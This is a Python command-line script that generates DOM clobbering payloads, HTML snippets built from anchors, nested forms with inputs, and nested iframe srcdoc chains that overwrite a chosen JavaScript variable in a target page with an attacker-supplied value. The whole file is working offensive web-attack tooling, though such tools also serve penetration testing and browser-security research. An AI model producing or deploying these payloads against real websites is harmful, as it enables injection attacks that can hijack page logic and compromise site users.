#!/usr/bin/env python3
import json
from argparse import ArgumentParser


HTML_DELAY = """<style>@import "https://example.com"</style>"""
QUOTE_CHAR = '"'
ALLOWED_ELEMENTS = ["a", "form", "input", "iframe"]
SUPPORTS_NAME_ATTR = ["embed", "form", "iframe", "image", "img", "object"]


def is_ending(element, attr_name):
    """Check if the HTML element can be clobbered with a known attribute."""
    with open("attributes.json", "r") as json_file:
        data = json.load(json_file)
        for attr in data[element]:
            if attr == attr_name:
                return True
        return False


def print_payloads(payloads):
    """Print the payloads to stdout."""
    for i, payload in enumerate(payloads):
        print("*" * 20, "PAYLOAD #" + str(i + 1), "*" * 20)
        print(payload)


def gen_payloads(variable_name, variable_value):
    """Generates the DOM Clobbering payloads."""
    document_scope = variable_name.startswith("document.")
    if variable_name.startswith("window.") or document_scope:
        variable_name = ".".join(variable_name.split(".")[1:])
    variable_value = variable_value.replace(QUOTE_CHAR, "&quot;")
    payloads = []
    depth = 1 + variable_name.count(".")
    chrome_required = depth > 1
    print("*" * 21, "INFO", "*" * 22)
    print(f"{ALLOWED_ELEMENTS = }")
    print(f"{variable_name = }")
    print(f"{variable_value = }")
    print(f"{depth = }")
    print(f"{document_scope = }")
    print(f"{chrome_required = }")

    if depth == 1:
        if not variable_value.startswith("http://") and not variable_value.startswith("https://"):
            variable_value = "a:" + variable_value
        payloads.append(f"""<a id="{variable_name}" href="{variable_value}"></a>""")

    elif depth == 2:
        first, second = variable_name.split(".")

        for elem in ALLOWED_ELEMENTS:
            if is_ending(elem, second):
                payloads.append(
                    f"""<{elem} id="{first}" {second}="{variable_value}"></{elem}>"""
                )
                if elem in SUPPORTS_NAME_ATTR:
                    payloads.append(
                        f"""<{elem} name="{first}" {second}="{variable_value}"></{elem}>"""
                    )

        if not variable_value.startswith("http://") and not variable_value.startswith("https://"):
            variable_value = "a:" + variable_value

        payloads.append(
            f"""<a id="{first}"></a><a id="{first}" name="{second}" href="{variable_value}"></a>"""
        )

    elif depth == 3:
        first, second, third = variable_name.split(".")

        if "form" in ALLOWED_ELEMENTS:
            if is_ending("form", third):
                payloads.append(
                    f"""<form id="{first}" name="{second}" {third}="{variable_value}"></form>
<form id="{first}">""")
            
            if "input" in ALLOWED_ELEMENTS:
                payloads.append(
                    f"""<form id="{first}" name="{second}">
    <input id="{third}" value="{variable_value}">
</form>
<form id="{first}">""")

    else:
        items = variable_name.split(".")

        if "form" in ALLOWED_ELEMENTS and "input" in ALLOWED_ELEMENTS:
            if depth == 4 and is_ending("input", items[-1]):
                payloads.append(
                    f"""<form id="{items[0]}" name="{items[1]}">
    <input id="{items[2]}" {items[3]}="{variable_value}">
</form>
<form id="{items[0]}">"""
                )

            if "iframe" in ALLOWED_ELEMENTS:
                payload = f"""<iframe name="{items[0]}" srcdoc="<iframe name='{items[1]}' srcdoc='<iframe name={items[2]} srcdoc="""
                for i, item in enumerate(items):
                    if i == len(items) - 1:
                        payload += f"""<a id={items[i - 1]}>""".replace(" ", "&amp;amp;#x20")
                    elif i == len(items) - 2:
                        payload += f"""<a id={item} name={items[i + 1]} href={variable_value}>""".replace(
                            " ", "&amp;amp;#x20"
                        )
                    elif i > 2:
                        pass

                payload += """'></iframe>"</iframe>"""
                payloads.append(payload)

    payloads = [payload.replace('"', QUOTE_CHAR) for payload in payloads]
    return payloads


if __name__ == "__main__":
    parser = ArgumentParser(description="DOM Clobbering payload generator.")
    parser.add_argument("var_name", help="Name of the variable (Ex: a.b.c.d.e)")
    parser.add_argument("var_value", help="Value of the variable (Ex: Hello World!)")
    args = parser.parse_args()

    payloads = gen_payloads(args.var_name, args.var_value)
    print_payloads(payloads)
